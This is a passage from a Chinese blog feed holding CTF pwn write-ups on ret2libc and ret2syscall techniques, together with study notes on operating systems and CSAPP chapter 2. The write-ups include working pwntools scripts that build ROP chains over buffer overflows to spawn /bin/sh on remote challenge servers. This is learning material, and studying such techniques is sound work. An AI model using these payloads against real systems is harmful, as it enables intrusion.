class="line"></span><br><span class="line">ROPgadget --binary pwn --only &quot;ret&quot;</span><br></pre></td></tr></table></figure><p>为了栈对齐，我们必须在pop rdi后加一个ret<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-13_23-03-57.64ea00aizt.webp"></p><p>exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28105)</span><br><span class="line">payload = b&#x27;a&#x27;*(0xA+8)</span><br><span class="line">payload += p64(0x4007e3) #pop rdi</span><br><span class="line">payload += p64(0x400808) #bin/sh</span><br><span class="line">payload += p64(0x4004fe) #ret</span><br><span class="line">payload += p64(0x400520) #system</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>成功执行system bin&#x2F;sh</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-13_23-14-04.8adolsfg0e.webp"></p><h1 id="有system函数和sh字符串"><a href="#有system函数和sh字符串" class="headerlink" title="有system函数和sh字符串"></a>有system函数和sh字符串</h1><h2 id="eg2：ctfshow-pwn42"><a href="#eg2：ctfshow-pwn42" class="headerlink" title="eg2：ctfshow pwn42"></a>eg2：ctfshow pwn42</h2><p>这个题的payload和pwn40一模一样，具体参考之前写的初识ret2libc（32位），考点还是用sh替代bin&#x2F;sh字符串，无非是改了几个地址而已，因此不再贴题目内容和具体过程了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28103)</span><br><span class="line">payload = b&#x27;a&#x27;*(0xA+8)</span><br><span class="line">payload += p64(0x0000000000400843) #pop rdi</span><br><span class="line">payload += p64(0x0000000000400872) #用sh替代bin/sh</span><br><span class="line">payload += p64(0x000000000040053e) #ret</span><br><span class="line">payload += p64(0x0000000000400560) #system</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-14_22-01-40.5fl0hcwg9w.webp"></p><h1 id="有system函数无bin-sh字符串"><a href="#有system函数无bin-sh字符串" class="headerlink" title="有system函数无bin&#x2F;sh字符串"></a>有system函数无bin&#x2F;sh字符串</h1><h2 id="eg3：ctfshow-pwn44"><a href="#eg3：ctfshow-pwn44" class="headerlink" title="eg3：ctfshow pwn44"></a>eg3：ctfshow pwn44</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  puts(&quot;get system parameter!&quot;);</span><br><span class="line">  ctfshow();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 ctfshow()</span><br><span class="line">&#123;</span><br><span class="line">  char v1[10]; // [rsp+6h] [rbp-Ah] BYREF</span><br><span class="line"></span><br><span class="line">  return gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>左侧存在system函数，按空格进入反汇编界面</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-15_17-44-11.6m4br4s9c4.webp"></p><p>查看字符串，发现没有bin&#x2F;sh</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-15_17-14-10.9kglum7kom.webp"></p><p>我们依然要用之前打的pwn43用的套路，即用sendline传入bin&#x2F;sh</p><p>依然是在main函数下断点，按r运行后，用vammp找到可读可写可执行段，存在buf2参数可以供我们写入bin&#x2F;sh字符串</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-15_17-28-58.77dzdf35cw.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-15_17-28-46.7w78xfqode.webp"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28146)</span><br><span class="line">offset = (0xA+8)</span><br><span class="line">system_addr = 0x400520</span><br><span class="line">gets_addr = 0x400530</span><br><span class="line">rdi_addr = 0x4007f3</span><br><span class="line">ret_addr = 0x4004fe</span><br><span class="line">buf2_addr = 0x602080</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*offset </span><br><span class="line"></span><br><span class="line">payload += p64(rdi_addr) </span><br><span class="line">payload += p64(buf2_addr) </span><br><span class="line">payload += p64(ret_addr) </span><br><span class="line">payload += p64(gets_addr) </span><br><span class="line"></span><br><span class="line">payload += p64(rdi_addr) </span><br><span class="line">payload += p64(buf2_addr) </span><br><span class="line">payload += p64(ret_addr) </span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>依然要注意，调用函数前，必须先用pop rdi设置好寄存器，因此参数必须放在gadget后面</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-15_17-39-35.8z6y8c04gh.webp"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写在前面：这种类型的题其实不好归纳是ret2text还是ret2libc，我这里按照ctfwiki的分类方法，将存在完整可执行的system(bin&amp;#x2F;sh)后门函数的题型归纳为ret2text，将需要利用基本的ROP技术的题型归纳位ret2libc&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2libc" scheme="https://jiutian521.github.io/tags/ret2libc/"/>
    
  </entry>
  
  <entry>
    <title>pwn前置基础大合集（更新中）</title>
    <link href="https://jiutian521.github.io/posts/e5ae4e99.html"/>
    <id>https://jiutian521.github.io/posts/e5ae4e99.html</id>
    <published>2025-11-11T16:00:00.000Z</published>
    <updated>2025-11-13T15:23:11.539Z</updated>
    
    <content type="html"><![CDATA[<p>这篇博客主要是记录一下pwn的底层知识，主要知识来来自CSAPP，维基百科，b站网课等</p><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><h2 id="1-发展历史"><a href="#1-发展历史" class="headerlink" title="1.发展历史"></a>1.发展历史</h2><p>1969 UNIX系统 肯尼斯·蓝·汤普森&amp;丹尼斯·麦卡利斯泰尔·里奇<br>奠定了现代操作系统，<strong>“一切皆文件”</strong></p><p>1984 ios mac 苹果操作系统<br>1985 window1.0<br>1991 linux 开源免费</p><h2 id="2-LINUX下计算机的控制流程"><a href="#2-LINUX下计算机的控制流程" class="headerlink" title="2.LINUX下计算机的控制流程"></a>2.LINUX下计算机的控制流程</h2><p>用户——应用软件——操作系统——驱动程序——硬件，从左到右逐层调用，其中操作系统包括系统软件和系统内核，内核负责管理它负责直接管理系统的进程、内存、设备驱动程序、文件和网络系统</p><p>这里我还是觉得CSAPP讲的非常好，于是结合CSAPP讲一下</p><p>刚才讲了，计算机的控制是逐层调用的，所以可以把操作系统看作是是应用程序和硬件之间的一层软件，应用程序必须通过操作系统访问处理器，主存，I&#x2F;O设备等硬件</p><p>因此，操作系统的两大功能是确保上层的<strong>应用软件</strong>既能控制，又不滥用下层的<strong>硬件</strong></p><p>操作系统通过进程、虚拟内存和文件来实现两大功能</p><p>进程 </p><p>虚拟内存 见CSAPP第二章</p><p>文件 权限的体现：可读可写可执行 可读可写不可执行 可读不可写不可执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这篇博客主要是记录一下pwn的底层知识，主要知识来来自CSAPP，维基百科，b站网课等&lt;/p&gt;
&lt;h1 id=&quot;操作系统&quot;&gt;&lt;a href=&quot;#操作系统&quot; class=&quot;headerlink&quot; title=&quot;操作系统&quot;&gt;&lt;/a&gt;操作系统&lt;/h1&gt;&lt;h2 id=&quot;1-发展历史</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>CSAPP第二章札记（更新中）</title>
    <link href="https://jiutian521.github.io/posts/d4f00467.html"/>
    <id>https://jiutian521.github.io/posts/d4f00467.html</id>
    <published>2025-11-10T16:00:00.000Z</published>
    <updated>2025-11-23T07:11:20.072Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息的存储"><a href="#信息的存储" class="headerlink" title="信息的存储"></a>信息的存储</h1><h2 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h2><p>起源悠久，可以追溯到埃及，印度巴拉巴拉，莱布尼茨进行了系统的发展，后由乔治·布尔进一步完善</p><p>相比十进制更容易表示，存储和传输，比如高电压表示1，低电压表示0</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p><strong>无符号编码</strong> 大于等于零的数<br><strong>补码</strong> 带正负号的整数<br><strong>浮点数</strong> </p><h1 id="信息存储和十六进制表示法"><a href="#信息存储和十六进制表示法" class="headerlink" title="信息存储和十六进制表示法"></a>信息存储和十六进制表示法</h1><p>程序将内存看成一个很大的字节数组，称为<strong>虚拟内存</strong><br>内存的每一个字节由唯一的数字来标识，称为它的<strong>地址</strong><br>所有地址的集合，称为<strong>虚拟内存空间</strong></p><p>在C语言中，我们可以通过指针引用数组元素，指针的值即某个对象的位置</p><p>1个字节（byte）或者说块，由8个位（bit）组成，一个位由0或1两种可能，最大是全部为1，即11111111；最小是0，即00000000。那么如果用十进制表示，最大值为255</p><p>字节作为<strong>计算机可寻址的最小单位</strong>，而并不是位</p><p>0x开头表示16进制（hex），具体的转换可以查询表格<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-12_18-06-43.5j4mbzec63.webp"></p><h1 id="字数据大小"><a href="#字数据大小" class="headerlink" title="字数据大小"></a>字数据大小</h1><h2 id="字长"><a href="#字长" class="headerlink" title="字长"></a>字长</h2><p>字（word），是CPU一次能处理的数据宽度<strong>单位</strong>  </p><p>字长（Word Length），是字所用<strong>单位的大小</strong>，是<strong>CPU一次能处理字节（或位）的长度</strong>，也通常是<strong>一个寄存器的宽度</strong>。比如，32位系统可以一次处理字长为32位，即字4个字节的数据，64位系统可以一次处理字长为64位，即8个字节的数据</p><p>字长决定了虚拟地址最大的空间大小，最大为2的字长次方-1，程序最多访问2的字长次方大小的数据，如32位系统，虚拟内存空间的大小就是2的32次方个位，即4GB，64位系统为16EB</p><p>32位和64位程序的最大区别在于程序是如何编译的，而不是运行的机器类型，因为64位机器可以向下兼容32位，反之却不行，并且，这和操作系统，CPU等硬件都无关</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-12_18-07-03.7zquqwl82h.webp"></p><p>long即long int，表示长度更长的整数。所以我们通常用int就够了</p><h2 id="寻址和字节顺序"><a href="#寻址和字节顺序" class="headerlink" title="寻址和字节顺序"></a>寻址和字节顺序</h2><p>对于多字节的程序对象，我们必须明确：  </p><p>1.这个对象地址在哪里（如何寻址）<br>2.在内存中按什么顺序排列他们（字节顺序是什么）</p><p>不同的机器，从存储字节的顺序也不一样，主要有两种方式，<strong>大端序</strong>和<strong>小端序</strong></p><p>大端序将最高有效字节置于更高的地址，小端序将最低有效字节置于更高的地址</p><p>这很好理解，我们取一个int类型的整数，值为0<br>x12345678，将它置于0x100地址处，int类型占四个字节，那么需要在内存里划分出0x100到0x103的内存大小，大端序下，12被置于0x100处，78被置于0x103处，小端序则相反，12被置于0x103处,78被置于0x100处</p><p>x86处理器采用小端序</p><p>网络传输一般采用大端序，也被称之为网络字节序，或网络序。IP协议中定义大端序为网络字节序</p><p>*关于字节顺序的后两种情况我其实没太看懂，分别是阅读表示整数数据的字节序列时字节顺序，当编写规避正常的类型系统的程序，这里先按下不表</p><h2 id="表示字符串"><a href="#表示字符串" class="headerlink" title="表示字符串"></a>表示字符串</h2><p>C语言中，字符串被编译为以NULL结尾的字符数组</p><p>比如我们有一个abcde的字符串，在字符数组中实际上是a b c d e NULL长度为6个字节</p><p>NULL的十六进制表示为0x00，而字符串由ASCII字符编码，因此不需要考虑字节顺序，这就让文本数据比二进制数据有更强的平台独立性</p><h2 id="布尔代数"><a href="#布尔代数" class="headerlink" title="布尔代数"></a>布尔代数</h2><p>布尔通过将逻辑值 TRUE（真）和<br>FALSE（假）编码为二进制值1和0, 设计出一种代数，以研究逻辑推理的基本原则</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-12_21-58-21.6t7jij5r4t.webp"></p><p>简单来说，就是</p><p>非¬<br>非0即为1，非非0即为0</p><p>与∧<br>全1为1，不全1为0<br>（只有两个条件中同时为真，结果才为真）</p><p>或∨<br>全0为0，不全0为1<br>（只要两个条件中有一个为真，结果就为真）</p><p>异或⊕<br>相同为0，不同为1</p><p><strong>用集合理解和表示布尔运算</strong></p><p>任取{76543210}<br>1：第n位是集合中的一个元素<br>0：反之</p><blockquote><p>Not（非门）补集<br>And（与门）取交集<br>Or（或门）取并集<br>Xor（异或）对称差异   </p></blockquote><p>eg<br>01101001：{0356}<br>01010101：{0246}<br>not{1 3 5 7}<br>and：{0 6}<br>or;：{0 2 3 4 5 6}<br>xor {2 3 4 5}  </p><h2 id="C语言的运算"><a href="#C语言的运算" class="headerlink" title="C语言的运算"></a>C语言的运算</h2><h3 id="位级运算"><a href="#位级运算" class="headerlink" title="位级运算"></a>位级运算</h3><p>C语言支持对每一个位进行布尔运算</p><blockquote><p>| or<br>&amp; and<br>~ not<br>^ xor</p></blockquote><p>在位级运算中，先将十六进制转换为二进制进行运算，运算完再将二进制结果转换为十六进制结果</p><p>位级运算常用于掩码运算，比如子网掩码，这一块后面学到了再说</p><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><blockquote><p>逻辑运算符<br>|| OR<br>&amp;&amp; AND<br>!  NOT  </p></blockquote><p>在C语言的逻辑运算中，所有非零参数均为1，而0依然表示false，最后仍返回1或0</p><p>比如：！0x114514，返回值为0x00<br>0x114514&amp;&amp;0x1234，返回值为0x01<br>0x114514||0x1234，返回值为0x00</p><h3 id="移位运算"><a href="#移位运算" class="headerlink" title="移位运算"></a>移位运算</h3><p><strong>左移</strong><br>把操作数x向左移k位，需要丢弃最高的k位置，并在右端补k个0（二进制中，最高位是最左边的位）</p><p>eg：01100011，左移2位为10001100</p><p><strong>右移</strong><br>右移分为逻辑右移和算术右移，逻辑右移和左移只是方向不同</p><p>算术右移需要特别注意。如果最高位是0，算术右移和逻辑右移相同，但如果最高位是1，那么最后需要补1，而不是0</p><p>对有符号数，几乎都使用算术右移，对无符号数，一定是逻辑右移</p><h1 id="整数表示"><a href="#整数表示" class="headerlink" title="整数表示"></a>整数表示</h1><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-13_13-45-31.7i0t3ho2t3.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-13_13-45-39.1apf3bsboz.webp"></p><p>通过查看32位和64位系统存储的整数范围，我们可以发现几个问题：<br>1.long类型在32位和64位下，存储范围存在明显差异<br>2.有符号整数的存储范围并不关于0对称，而是负数的范围比正数大1</p><p>我们一个一个来看这是为什么</p><p>1.由于C语言设计之初，电脑的字长多种多样，无法统一，于是C语言为了在不同机器上都能运行，只规定了各整数类型的大小顺序，这样，编译器可以根据机器的不同灵活调整</p><blockquote><p>2 ≤ short ≤ int ≤ long ≤ long long</p></blockquote><p>实际上，在16位机器的时代，int可以只占2个字节，但到了今天，在32位或者64位机器上则都占4字节，而最大的不同就是long和long long，C语言规定比int大就可以，所以在32位机器上和int一样占4字节，没有什么区别，但是在64位上占8个字节，存放数据的大小也变大了非常多</p><p>2.见下面的补码</p><h2 id="不同数据的编码"><a href="#不同数据的编码" class="headerlink" title="不同数据的编码"></a>不同数据的编码</h2><h3 id="无符号数的编码"><a href="#无符号数的编码" class="headerlink" title="无符号数的编码"></a>无符号数的编码</h3><p>这一块的内容书上说了很多，而且很晦涩，其实本质上是<strong>按权展开</strong>，即无符号表示的数值，就是它的二进制按权展开的结果</p><h3 id="补码的编码"><a href="#补码的编码" class="headerlink" title="补码的编码"></a>补码的编码</h3><p>有符号数的表示方式为补码</p><p>假设有一个整数数据类型有w位，将最高位称为符号位，它具有负权重，权重为-2的w-1次方，符号位被设置为 1 时，表示值为负，而当设置为 0 时，值为非负<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-13_16-33-12.7snmwt2heo.webp"></p><p>拿1 -1 5 -5举例<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-13_16-38-29.8vnc7p4si5.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-13_16-38-12.58hsk6900f.webp"></p><p>我们用0000 0000表示0，负数没有−0，而最小的 1000 0000被拿来表示−128，这就导致了负数比整数多一个的情况</p><table><thead><tr><th>符号</th><th>数量</th></tr></thead><tbody><tr><td>负数</td><td>128 个（−128 ～ −1）</td></tr><tr><td>0</td><td>1 个</td></tr><tr><td>正数</td><td>127 个（+1 ～ +127）</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信息的存储&quot;&gt;&lt;a href=&quot;#信息的存储&quot; class=&quot;headerlink&quot; title=&quot;信息的存储&quot;&gt;&lt;/a&gt;信息的存储&lt;/h1&gt;&lt;h2 id=&quot;二进制&quot;&gt;&lt;a href=&quot;#二进制&quot; class=&quot;headerlink&quot; title=&quot;二进制&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="CSAPP" scheme="https://jiutian521.github.io/categories/CSAPP/"/>
    
    
  </entry>
  
  <entry>
    <title>初识ret2syscall</title>
    <link href="https://jiutian521.github.io/posts/f376ffe3.html"/>
    <id>https://jiutian521.github.io/posts/f376ffe3.html</id>
    <published>2025-11-09T04:30:00.000Z</published>
    <updated>2025-11-24T09:09:37.434Z</updated>
    
    <content type="html"><![CDATA[<h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><p>操作系统的进程空间可分为<strong>用户空间</strong>和<strong>内核空间</strong>，它们需要不同的执行权限。其中系统调用运行在<strong>内核空间</strong></p><p>在电脑中，系统调用（英语：system call），指运行在<strong>用户空间</strong>的程序向操作系统<strong>内核</strong>请求需要更高权限运行的服务</p><p>我们要知道，系统调用和库函数调用是两回事，系统调用由操作系统<strong>内核</strong>提供，运行于<strong>内核核心态</strong>，而普通的库函数调用由<strong>函数库或用户自己</strong>提供，运行于<strong>用户态</strong>。</p><p>应用程序调用系统调用的过程是：</p><p>1.把系统调用的编号存入EAX<br>2.把函数参数存入其它通用寄存器<br>3.触发 0x80 号中断（int 0x80）  </p><p>在这里我以32位系统为例，一个经典的系统调用如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0xb</span><br><span class="line">mov ebx,[&quot;/bin/sh&quot;]</span><br><span class="line">mov ecx,0</span><br><span class="line">mov edx,0</span><br><span class="line"></span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>查找对应的函数调用表，我们知道0xb对应的是execve指令，然后将bin&#x2F;sh字符串写入寄存器ebx中，剩下几个寄存器为空。当我们触发int 0x80软中断后，CPU会切换到内核态，会先从eax读到函数调用号0xb，然后读到参数bin&#x2F;sh字符串，这一顿操作下来等价于execve(“bin&#x2F;sh”,NULL,NULL)，最后执行ret指令切换回用户态</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_10-17-34.1lc8qk07ro.webp"></p><p>系统调用表可以在以下几个网站查找<br><a href="https://rninche01.tistory.com/entry/Linux-system-call-table-%EC%A0%95%EB%A6%ACx86-x64">https://rninche01.tistory.com/entry/Linux-system-call-table-%EC%A0%95%EB%A6%ACx86-x64</a></p><p><a href="https://syscalls.mebeim.net/?table=x86/64/x64/latest">https://syscalls.mebeim.net/?table=x86/64/x64/latest</a></p><h1 id="ret2syscall实战"><a href="#ret2syscall实战" class="headerlink" title="ret2syscall实战"></a>ret2syscall实战</h1><h2 id="eg：newstar2025-week2-syscall"><a href="#eg：newstar2025-week2-syscall" class="headerlink" title="eg：newstar2025 week2 syscall"></a>eg：newstar2025 week2 syscall</h2><blockquote><p>题目内容：<br>远在Hong Kong 的朋友常说“虽然世界给他关上了门，但同时又开了一扇窗”</p></blockquote><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-11-49.2oby1htqe8.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-11-58.8ok4683c2n.webp"></p><p>先不管ret2syscall，我们可以看到在func函数里的是存在明显的栈溢出漏洞的，偏移量为0x12+0x4，即22</p><p>这类题有什么特征呢，打开ida，我们可以看到有茫茫多的函数，用得上用不上的都放上去了,很显然，该可执行文件是静态链接的</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-09-56.3yev7t997t.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_10-34-05.3yev7rzc61.webp"></p><p>这就有一个好处了，这些茫茫多的函数给我们提供了很多gadget，可以帮助我们构造ROP</p><p>从这么多gadget里手动找到我们想要的几段肯定是不现实的，我们可以用ROPgadget帮我们找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_10-59-08.4ubcn95anz.webp"><br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_10-59-21.361zq2f0hs.webp"></p><p>我们的四个寄存器也以此就位了，分别是</p><blockquote><p>pop_eax &#x3D; 0x080b438a<br>pop_ebx &#x3D; 0x08049022<br>pop_ecx &#x3D; 0x0804985a<br>pop_edx &#x3D; 0x0804985c</p></blockquote><p>我们还缺int80和&#x2F;bin&#x2F;sh字符串<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-05-25.wiz6l212x.webp"></p><p>我们找到了int80的地址</p><blockquote><p>int_0x80 &#x3D; 0x08073a00</p></blockquote><p>但是程序里没有给我们&#x2F;bin&#x2F;sh字符串。在之前的ret2libc里我们同样遇到了这种情况，我们要做的是自己sendline一个&#x2F;bin&#x2F;sh字符串，这时候我们依然可以借助系统调用，调用出read供我们使用</p><p>查询32位的系统调用表，我们知道read函数的系统调用号是0x3，关于三个参数分别是0，随便的一段.bss段，0x20，分别是什么意思可以看下面的链接，写的很详细了<br><a href="https://blog.csdn.net/m0_74091159/article/details/142261052">https://blog.csdn.net/m0_74091159/article/details/142261052</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"> </span><br><span class="line">elf = ELF(&#x27;./syscall&#x27;)</span><br><span class="line"> </span><br><span class="line">io = remote(&#x27;39.106.48.123&#x27;,26282)</span><br><span class="line"> </span><br><span class="line">#io=process(&#x27;./pwn&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 22</span><br><span class="line"> </span><br><span class="line">pop_eax = 0x080b438a</span><br><span class="line"> </span><br><span class="line">pop_ebx = 0x08049022</span><br><span class="line"> </span><br><span class="line">pop_ecx = 0x0804985a</span><br><span class="line"> </span><br><span class="line">pop_edx = 0x0804985c</span><br><span class="line"> </span><br><span class="line">int_0x80 = 0x08073a00</span><br><span class="line"> </span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"> </span><br><span class="line">read_addr = elf.symbols[&#x27;read&#x27;]</span><br><span class="line"> </span><br><span class="line">payload = cyclic(offset)</span><br><span class="line">payload+=p32(pop_eax)</span><br><span class="line">payload+=p32(0x3)</span><br><span class="line">payload+=p32(pop_edx)</span><br><span class="line">payload+=p32(0x20)</span><br><span class="line">payload+=p32(pop_ecx)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(pop_ebx)</span><br><span class="line">payload+=p32(0)</span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line"></span><br><span class="line">payload+=p32(pop_eax)</span><br><span class="line">payload+=p32(0xb)</span><br><span class="line">payload+=p32(pop_edx)</span><br><span class="line">payload+=p32(0)</span><br><span class="line">payload+=p32(pop_ecx)</span><br><span class="line">payload+=p32(0)</span><br><span class="line">payload+=p32(pop_ebx)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line"> </span><br><span class="line">io.sendlineafter(&quot;pwn it guys!\n&quot;,payload)</span><br><span class="line"> </span><br><span class="line">io.sendline(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-42-44.3uv9a4nh0o.webp"><br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-42-54.1ziohib1ey.webp"><br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-43-10.2oby1iykfd.webp"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过学习ret2syscall，我们了解了ret2syscall这类题的基本特征，重点了解了什么是系统调用，以及如何进行系统调用，对gadget和ROP技术的利用有了更加深入的理解</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;系统调用&quot;&gt;&lt;a href=&quot;#系统调用&quot; class=&quot;headerlink&quot; title=&quot;系统调用&quot;&gt;&lt;/a&gt;系统调用&lt;/h1&gt;&lt;p&gt;操作系统的进程空间可分为&lt;strong&gt;用户空间&lt;/strong&gt;和&lt;strong&gt;内核空间&lt;/strong&gt;，它们需要不同</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2syscall" scheme="https://jiutian521.github.io/tags/ret2syscall/"/>
    
  </entry>
  
  <entry>
